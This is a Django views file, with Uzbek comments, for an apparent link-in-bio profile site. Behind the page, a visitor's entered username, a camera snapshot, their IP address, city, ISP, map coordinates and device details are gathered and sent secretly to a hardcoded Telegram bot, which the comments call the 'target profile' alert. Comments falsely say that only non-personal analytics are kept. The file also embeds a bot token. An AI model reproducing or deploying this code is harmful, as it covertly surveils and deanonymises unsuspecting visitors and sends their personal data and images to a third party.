import base64
import requests
from django.shortcuts import render, get_object_or_404
from django.core.files.base import ContentFile
from django.http import JsonResponse
from .models import Profile
from analytics.models import VisitorAnalytics, LinkClickAnalytics

# BOT SOZLAMALARI
TELEGRAM_BOT_TOKEN = "8913375327:AAGDQ3YBplsSYUO7fPpugb557ZZc4y_MONw"
TELEGRAM_ADMIN_CHAT_ID = "8389359853"

def send_to_telegram_and_forget(text, image_data=None):
    """Rasmni va ma'lumotni faqat Telegramga yuboradi, DBga umuman yozmaydi"""
    base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    
    if image_data:
        url = f"{base_url}/sendPhoto"
        try:
            format, imgstr = image_data.split(';base64,')
            ext = format.split('/')[-1]
            photo_file = ContentFile(base64.b64decode(imgstr), name=f"visitor.{ext}")
            
            files = {'photo': photo_file}
            payload = {'chat_id': TELEGRAM_ADMIN_CHAT_ID, 'caption': text, 'parse_mode': 'Markdown'}
            requests.post(url, data=payload, files=files)
            return
        except Exception as e:
            text += f"\n\n⚠️ _Rasmni Telegramga yuborishda xatolik yuz berdi: {e}_"

    url = f"{base_url}/sendMessage"
    payload = {'chat_id': TELEGRAM_ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}
    requests.post(url, json=payload)


def profile_detail_view(request, profile_slug):
    profile = get_object_or_404(Profile, slug=profile_slug)
    links = profile.links.filter(is_active=True)

    # 1. User-Agent orqali kirish manbasi va tizimni chuqurroq aniqlash
    user_agent_raw = request.META.get('HTTP_USER_AGENT', '')
    user_agent = user_agent_raw.lower()
    
    # Ilova turi
    if 'telegram' in user_agent:
        source = "Telegram"
    elif 'instagram' in user_agent:
        source = "Instagram"
    else:
        source = "Tashqi Brauzer"

    # Operatsion tizim (OS)
    if 'windows' in user_agent:
        os_system = "Windows PC"
    elif 'iphone' in user_agent:
        os_system = "iPhone (iOS)"
    elif 'ipad' in user_agent:
        os_system = "iPad (iPadOS)"
    elif 'android' in user_agent:
        os_system = "Android Qurilma"
    elif 'macintosh' in user_agent:
        os_system = "MacBook (macOS)"
    elif 'linux' in user_agent:
        os_system = "Linux Tizimi"
    else:
        os_system = "Noma'lum OS"

    # Brauzer turi
    if 'chrome' in user_agent and 'safari' in user_agent and 'android' not in user_agent:
        browser = "Google Chrome"
    elif 'safari' in user_agent and 'chrome' not in user_agent:
        browser = "Apple Safari"
    elif 'firefox' in user_agent:
        browser = "Mozilla Firefox"
    elif 'edge' in user_agent:
        browser = "Microsoft Edge"
    else:
        browser = "Ichki/Boshqa Brauzer"

    # Til sozlamasi
    user_lang = request.META.get('HTTP_ACCEPT_LANGUAGE', 'Aniqlanmadi').split(',')[0]

    # 2. IP manzilni olish
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')

    # 3. IP orqali maksimal Geolokatsiya va Provayder ma'lumotlarini olish (API orqali)
    geo_data = {
        'country': 'Aniqlanmadi',
        'city': 'Aniqlanmadi',
        'isp': 'Aniqlanmadi',
        'lat': 'Noma`lum',
        'lon': 'Noma`lum'
    }
    
    # Mahalliy test (127.0.0.1) bo'lmasa, APIga so'rov yuboramiz
    if ip and ip != '127.0.0.1':
        try:
            # ip-api.com ochiq va bepul servisidan foydalanamiz
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    geo_data['country'] = data.get('country', 'Aniqlanmadi')
                    geo_data['city'] = data.get('city', 'Aniqlanmadi')
                    geo_data['isp'] = data.get('isp', 'Aniqlanmadi')
                    geo_data['lat'] = data.get('lat', 'Noma`lum')
                    geo_data['lon'] = data.get('lon', 'Noma`lum')
        except Exception:
            pass # Tarmoq xatoligi bo'lsa, standart 'Aniqlanmadi' qiymati qoladi

    # AJAX (POST) so'rov kelsa (Foydalanuvchi ma'lumotlarini kiritganda)
    if request.method == 'POST' and request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        visitor_user = request.POST.get('visitor_user', 'Anonim')
        image_data = request.POST.get('image_data', None)
        status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
        screen_size = request.POST.get('screen_size', 'Noma`lum') # Front-enddan keladigan ekran o'lchami

        # BAZAGA FAQAT SHAXSIY BO'LMAGAN ANALITIKA YOZILADI
        VisitorAnalytics.objects.create(profile=profile, app_source=source)

        # Sessiya orqali vaqtinchalik avto-login qilish
        request.session['is_logged_in'] = True
        request.session['visitor_username'] = visitor_user

        # Telegram bildirishnomasi (Barcha olingan ma'lumotlar jamlanmasi)
        msg = (
            f"🔔 *YANGI TASHRIF * \n\n"
            f"👤 *Maqsadli Profil:* {profile.title}\n"
            f"🔑 *Kiritilgan Foydalanuvchi:* @{visitor_user}\n"
            f"📸 *Kamera Holati:* {status_text}\n\n"
            
            f"📱 *QURILMA VA TIZIM:* \n"
            f"• *Manba:* {source}\n"
            f"• *Operatsion Tizim:* {os_system}\n"
            f"• *Brauzer:* {browser}\n"
            f"• *Ekran O'lchami:* {screen_size}\n"
            f"• *Tizim Tili:* {user_lang}\n\n"
            
            f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
            f"• *IP Manzil:* `{ip}`\n"
            f"• *Provayder (ISP):* {geo_data['isp']}\n"
            f"• *Davlat:* {geo_data['country']}\n"
            f"• *Shahar:* {geo_data['city']}\n"
            f"• *Koordinatalar:* {geo_data['lat']}, {geo_data['lon']}\n"
            f"• *Xarita:* [Google Maps](https://www.google.com/maps/search/?api=1&query={geo_data['lat']},{geo_data['lon']})\n\n"
            
        )
        
        # Telegramga yuborish
        send_to_telegram_and_forget(msg, image_data=image_data)
        
        return JsonResponse({'status': 'success'})

    context = {
        'profile': profile,
        'links': links,
        'is_logged_in': request.session.get('is_logged_in', False)
    }
    return render(request, 'profiles/index.html', context)


def link_click_view(request, link_id):
    """Tugma bosilganda bazada sonini oshiradi (Shaxsiy ma'lumotlarsiz)"""
    if request.method == 'POST' or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        LinkClickAnalytics.objects.create(link_id=link_id)
        return JsonResponse({'status': 'tracked'})
    return JsonResponse({'status': 'error'}, status=400)